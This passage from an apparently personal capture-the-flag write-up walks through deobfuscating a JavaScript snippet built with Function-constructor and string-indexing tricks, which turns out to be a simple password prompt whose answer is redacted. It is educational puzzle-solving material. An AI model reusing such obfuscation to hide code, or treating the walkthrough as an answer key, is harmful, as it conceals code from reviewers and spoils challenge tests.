"")[object.var5] + object.var9 + object.var18[object.var11] + object.var21 + (object.var22 + "")[object.var16 + object.var15] + '\\"' + object.var21 + object.var18[object.var11] + "\\" + object.var3 + object.var14 + object.var3 + (object.var22 + "")[object.var15] + object.var4 + "\\" + object.var3 + object.var10 + object.var14 + object.var4 + (object.var22 + "")[object.var11] + object.var18[object.var5] + "!" + '\\"' + (object.var22 + "")[object.var16 + object.var16] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[object.var16 * object.var10] + ";" + "\"")())();
{% endhighlight %}

This script creates an object `object` and initialize some properties. `object.var17` is not used, so I can delete it. I used the `alert(object.varX);` function to determine the default values of `varX` before the last call to the `object.var22()` function.

I get these values:

{% highlight javascript linenos %}
object.var1:  0
object.var2:  f
object.var3:  1
object.var4:  a
object.var5:  2
object.var6:  b
object.var7:  d
object.var8:  3
object.var9:  e
object.var10: 4
object.var11: 5
object.var12: c
object.var13: 6
object.var14: 7
object.var15: 8
object.var16: 9
object.var18: constructor
object.var19: o
object.var20: return
object.var21: t
object.var22: function Function() {    [native code]}
object.var23: u
{% endhighlight %}

I can replace the variables with their values and delete them. Indeed, they are not redefined afterward. However, I can't replace `object.var22` as it is a function, and I have to make sure that it is correctly defined.

Here's what I have now:

{% highlight javascript linenos %}
object = {
	var22: (!"" + "")[1]
};
object.var22 = (0)['constructor']['constructor'];
	
object.var22(object.var22('return' + "\"" + 'a' + "=" + "\\" + 1 + 6 + 0 + 'constructor'[5] + 'o' + "\\" + 1 + 5 + 5 + "\\" + 1 + 6 + 0 + 't' + (object.var22 + "")[9 + 8] + '\\"' + "\\" + 1 + 6 + 0 + 'a' + 'constructor'[3] + 'constructor'[3] + "\\" + 1 + 6 + 7 + 'o' + 'constructor'[5] + 'd' + ":" + '\\"' + (object.var22 + "")[9 + 9] + ";" + (object.var22 + "")[5] + 'f' + (object.var22 + "")[9 + 8] + 'a' + "=" + "=" + '\\"' + (object + "")[0] + 0 + 'b' + 'f' + 'u' + 'constructor'[3] + 'c' + 'a' + 't' + 3 + 'd' + (object.var22 + "")[5 * 4] + (object + "")[3] + 'constructor'[3] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[9 * 4] + (object + "")[7 * 2] + '\\"' + (object.var22 + "")[9 + 9] + (object.var22 + "")[5 * 4] + 'a' + (![] + "")[2] + 'e' + 'constructor'[5] + 't' + (object.var22 + "")[9 + 8] + '\\"' + 't' + "\\" + 1 + 5 + 0 + 'e' + (object.var22 + "")[8] + 't' + 'o' + "\\" + 1 + 5 + 3 + 'e' + 'constructor'[2] + (object.var22 + "")[8] + (object.var22 + "")[5] + 'constructor'[3] + (object.var22 + "")[8] + 't' + "\\" + 1 + 5 + 0 + 'e' + (object.var22 + "")[8] + "\\" + 1 + 6 + 0 + 'a' + 'constructor'[3] + 'constructor'[3] + "\\" + 1 + 6 + 7 + 'o' + 'constructor'[5] + 'd' + '\\"' + (object.var22 + "")[9 + 9] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[9 * 4] + 'e' + (![] + "")[2] + 'constructor'[3] + 'e' + (object.var22 + "")[5 * 4] + 'a' + (![] + "")[2] + 'e' + 'constructor'[5] + 't' + (object.var22 + "")[9 + 8] + '\\"' + 't' + 'constructor'[5] + "\\" + 1 + 7 + 1 + (object.var22 + "")[8] + 'a' + "\\" + 1 + 4 + 7 + 'a' + (object.var22 + "")[5] + 'constructor'[2] + "!" + '\\"' + (object.var22 + "")[9 + 9] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[9 * 4] + ";" + "\"")())();
{% endhighlight %}

We can see that the parameter given to the function `object.var22 o object.var22` has been obfuscated too, but a simple call to the `alert` function will deobfuscate it:

{% highlight javascript linenos %}
JS> alert('return' + "\"" + 'a' + "=" + "\\" + 1 + 6 + 0 + 'constructor'[5] + 'o' + "\\" + 1 + 5 + 5 + "\\" + 1 + 6 + 0 + 't' + (object.var22 + "")[9 + 8] + '\\"' + "\\" + 1 + 6 + 0 + 'a' + 'constructor'[3] + 'constructor'[3] + "\\" + 1 + 6 + 7 + 'o' + 'constructor'[5] + 'd' + ":" + '\\"' + (object.var22 + "")[9 + 9] + ";" + (object.var22 + "")[5] + 'f' + (object.var22 + "")[9 + 8] + 'a' + "=" + "=" + '\\"' + (object + "")[0] + 0 + 'b' + 'f' + 'u' + 'constructor'[3] + 'c' + 'a' + 't' + 3 + 'd' + (object.var22 + "")[5 * 4] + (object + "")[3] + 'constructor'[3] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[9 * 4] + (object + "")[7 * 2] + '\\"' + (object.var22 + "")[9 + 9] + (object.var22 + "")[5 * 4] + 'a' + (![] + "")[2] + 'e' + 'constructor'[5] + 't' + (object.var22 + "")[9 + 8] + '\\"' + 't' + "\\" + 1 + 5 + 0 + 'e' + (object.var22 + "")[8] + 't' + 'o' + "\\" + 1 + 5 + 3 + 'e' + 'constructor'[2] + (object.var22 + "")[8] + (object.var22 + "")[5] + 'constructor'[3] + (object.var22 + "")[8] + 't' + "\\" + 1 + 5 + 0 + 'e' + (object.var22 + "")[8] + "\\" + 1 + 6 + 0 + 'a' + 'constructor'[3] + 'constructor'[3] + "\\" + 1 + 6 + 7 + 'o' + 'constructor'[5] + 'd' + '\\"' + (object.var22 + "")[9 + 9] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[9 * 4] + 'e' + (![] + "")[2] + 'constructor'[3] + 'e' + (object.var22 + "")[5 * 4] + 'a' + (![] + "")[2] + 'e' + 'constructor'[5] + 't' + (object.var22 + "")[9 + 8] + '\\"' + 't' + 'constructor'[5] + "\\" + 1 + 7 + 1 + (object.var22 + "")[8] + 'a' + "\\" + 1 + 4 + 7 + 'a' + (object.var22 + "")[5] + 'constructor'[2] + "!" + '\\"' + (object.var22 + "")[9 + 9] + (object.var22 + "").replace("    ", "").replace("]\x0a}", "] }")[9 * 4] + ";" + "\"");

//Pop-up:
return"a=\160ro\155\160t(\"\160ass\167ord:\");if(a==\"[0bfuscat3d{js}]\"){alert(\"t\150e to\153en is t\150e \160ass\167ord\")}else{alert(\"tr\171 a\147ain!\")};"
	
//i.e:
return"a=prompt("password:");if(a=="[REDACTED]"){alert("the token is the password")} else{alert("try again!")};" <-- deobfuscated code
{% endhighlight %}

The file `XOXO_deobfuscated.html` contains the deobfuscated JS code. It is clear that the password (i.e. the token) asked is `[REDACTED]`.

  [Download Link]: /rsc/Airbus/2015-10-05-Trust-the-Future/CHALLENGES.gpg
  [XOR Link]: /rsc/Airbus/2015-10-05-Trust-the-Future/xor_decryption.py
  [Hidden img]: /rsc/Airbus/2015-10-05-Trust-the-Future/HIDDEN.png
  [Hidden img solution]: /rsc/Airbus/2015-10-05-Trust-the-Future/HIDDEN_solution.png
  [/etc/shadow on Wikipedia]: https://en.wikipedia.org/wiki/Passwd#Shadow_file
